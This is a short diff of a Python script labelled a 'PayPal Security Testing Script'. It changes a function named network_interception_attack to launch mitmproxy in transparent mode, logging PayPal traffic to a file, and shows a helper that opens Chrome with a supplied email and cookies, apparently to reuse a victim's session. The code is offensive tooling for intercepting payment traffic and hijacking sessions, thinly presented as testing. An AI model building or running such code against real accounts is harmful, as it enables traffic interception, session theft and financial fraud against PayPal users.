@@ -1,6 +1,5 @@
 import time
 import random
-import requests
 import subprocess
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service as ChromeService
@@ -56,7 +55,8 @@ def launch_chrome_with_session(email, cookies):
 
 def network_interception_attack():
     print("Starting network interception attack...")
-    subprocess.Popen(["mitmproxy", "-w", "paypal_traffic.log"])
+    # Mitmproxy should be launched in a background process
+    subprocess.Popen(["mitmproxy", "-w", "paypal_traffic.log", "--mode", "transparent"])
 
 def main():
     print("PayPal Security Testing Script")
